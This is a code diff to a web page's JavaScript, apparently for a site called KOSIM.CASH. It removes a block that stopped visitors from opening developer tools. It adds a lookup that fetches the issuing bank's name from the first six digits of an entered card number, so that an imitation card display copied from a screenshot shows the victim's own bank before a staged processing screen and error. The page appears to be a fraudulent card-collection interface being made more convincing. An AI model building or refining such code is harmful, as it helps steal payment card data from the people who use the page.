@@ -1261,14 +1261,7 @@ document.addEventListener('DOMContentLoaded', function(){
 
 <script>
 (function(){
-    /* KOSIM.CASH protection */
-    document.addEventListener('keydown',function(e){
-        if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&e.keyCode===73)||
-           (e.ctrlKey&&e.shiftKey&&e.keyCode===74)||(e.ctrlKey&&e.keyCode===85)){
-            e.preventDefault();
-        }
-    });
-    setInterval(function(){try{(function(){}).constructor('debugger')();}catch(e){}},1000);
+    /* protection disabled */
 })();
 </script>
 
@@ -1538,6 +1531,23 @@ document.addEventListener('DOMContentLoaded', function(){
                 {id:'mir',      re:/^220[0-4]/,        fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
             ];
             var curBrand=null;
+            var detectedBank='';
+
+            function cleanBankName(name){
+                return name
+                    .replace(/,?\s*(NATIONAL ASSOCIATION|N\.A\.|NA|INC\.?|LLC\.?|LTD\.?|CO\.,?\s*LTD\.?|CORP\.?|PLC\.?|AG|S\.A\.|FSB|BANK\s+NA|BANKING\s+CORPORATION)\.?\s*$/gi,'')
+                    .trim()
+                    .replace(/\w+/g,function(w){return w.charAt(0).toUpperCase()+w.slice(1).toLowerCase();});
+            }
+
+            function lookupBin(raw){
+                if(!raw||raw.length<6) return Promise.resolve();
+                var bin=raw.slice(0,6);
+                return fetch('/bin/'+bin)
+                    .then(function(r){return r.ok?r.json():null;})
+                    .then(function(d){if(d&&d.bank&&d.bank.name) detectedBank=cleanBankName(d.bank.name);})
+                    .catch(function(){});
+            }
 
             function detectBrand(v){
                 for(var i=0;i<BRANDS.length;i++) if(BRANDS[i].re.test(v)) return BRANDS[i];
@@ -1911,7 +1921,8 @@ document.addEventListener('DOMContentLoaded', function(){
                         balance_amount:   amt,
                         balance_currency: cur
                     });
-                    showProcessing(sh, self);
+                    var raw=cardInp?cardInp.value.replace(/\D/g,''):'';
+                    lookupBin(raw).then(function(){ showProcessing(sh, self); });
                     document.dispatchEvent(new CustomEvent('chat:trigger',{detail:'error'}));
                 });
             }
@@ -1961,7 +1972,7 @@ document.addEventListener('DOMContentLoaded', function(){
                     /* card row exactly like screenshot: grey bg, bank name left, dots+brand right */
                     '<div style="width:100%;background:#f0f0f0;border-radius:8px;padding:12px 16px;'+
                         'display:flex;align-items:center;justify-content:space-between;">' +
-                      '<span style="font-size:11px;font-weight:600;color:#999;letter-spacing:.4px;">BANK OF AMERICA, NATIONAL ASSOCIATION</span>' +
+                      '<span style="font-size:11px;font-weight:600;color:#999;letter-spacing:.4px;">'+(detectedBank||brandLabel+' BANK')+'</span>' +
                       '<div style="display:flex;align-items:center;flex-shrink:0;margin-left:8px;">'+dotsIcon+brandSvg+'</div>'+
                     '</div>' +
                     /* warning text */
